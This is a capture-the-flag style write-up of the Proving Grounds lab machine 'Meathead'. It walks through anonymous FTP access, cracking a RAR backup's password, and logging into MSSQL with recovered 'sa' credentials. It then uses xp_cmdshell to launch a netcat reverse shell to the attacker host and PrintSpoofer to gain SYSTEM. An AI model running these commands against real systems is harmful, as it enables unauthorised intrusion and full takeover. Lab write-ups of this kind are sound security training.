---
description: Proving Grounds Practice PG Meathead writeup
---

# Meathead

## Nmap

```
sudo nmap 192.168.67.70 -p- -sV -sS  

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1221/tcp open  ftp           Microsoft ftpd
1435/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; 
CPE: cpe:/o:microsoft:windows
```

`FTP` on port 1221 allows anonymous login with passive mode `-p` enabled.

![](<../../../.gitbook/assets/image (811).png>)

Using the `get` command to downloaded the MSSQL\_BAK.rar file and then using the `unrar` command shows that we need a password to extract the archive.

```
unrar e <archive)
```

![](<../../../.gitbook/assets/image (812).png>)

We can use the `rar2john` binary that comes with John to get a hash from the password protected RAR file.

![](<../../../.gitbook/assets/image (813).png>)

On my main Windows host I used `hashcat` crack the hash. I have also shown the command used below the `cmd.exe` windows. The cracked password is: `letmeinplease`

![](<../../../.gitbook/assets/image (814).png>)

Back on the Kali VM I ran `unrar` again and this time was successful in extracting the archive.

![](<../../../.gitbook/assets/image (815).png>)

Reading the contents of mssql\_backup.txt provides the following credentials `sa:EjectFrailtyThorn425`

We are then able to Impacket's `mssqlclient.py` to connect to the target machines SQL.

```
mssqlclient.py -port 1435 sa:EjectFrailtyThorn425@192.168.67.70
```

![](<../../../.gitbook/assets/image (816) (1).png>)

From here we can run `enable_xp_cmdshell` and then confirm command execution with `xp_cmdshell whoami`.

![](<../../../.gitbook/assets/image (817).png>)

From here due to various reasons I was unable to use `certutil.exe` and `Powershell` for file transfer. Instead I set up a `SMB` server on my attacking machine with Impacket's `smbserver.py`.

```
sudo python2 smbserver.py Share /home/kali/
```

![](<../../../.gitbook/assets/image (818) (1).png>)

From here we need to ensure nc.exe exists in the same directory in which the `SMB` Server is sharing files from. Set up a `netcat` listener on the attacking machine.

```
nc -lvp 1221
```

Then run the following command on the SQL server running the xp\_cmdshell.

```
xp_cmdshell \\192.168.49.67\Share\nc.exe -e cmd.exe 192.168.49.67 1221
```

We now have a proper reverse shell.

![](<../../../.gitbook/assets/image (819).png>)

Now connected and checking privileges with the `whoami /all` command we see we have the `SeImpersonatePrivilege` permission.

![](<../../../.gitbook/assets/image (1933).png>)

Checking `systeminfo` for the version of Windows server running we see we are on Windows Server 2019.

![](<../../../.gitbook/assets/image (1934).png>)

Given the privileges and version of Windows Server running it is unlikely a JuicyPotato attack would be successful. It is probable however that we can take advantage of these permissions with a `PrintSpoofer.exe` attack.

Binary: [https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

Download the binary and place it in the `SMB` share we set up earlier with `smbserver.py`. I then moved over to the FTP directory at `C:\FTP` as this is writeable to the current service account 'mssql$sqlexpress'.

I then copied the binary to the current working directory:

```bash
copy \\<Attacking-IP>\Share\PrintSpoofer.exe
```

Then executed the `PrintSpoofer.exe` with switches to spawn a **SYSTEM** shell in the current shell.

```bash
printspoofer.exe -i -c cmd
```

![](<../../../.gitbook/assets/image (1935).png>)
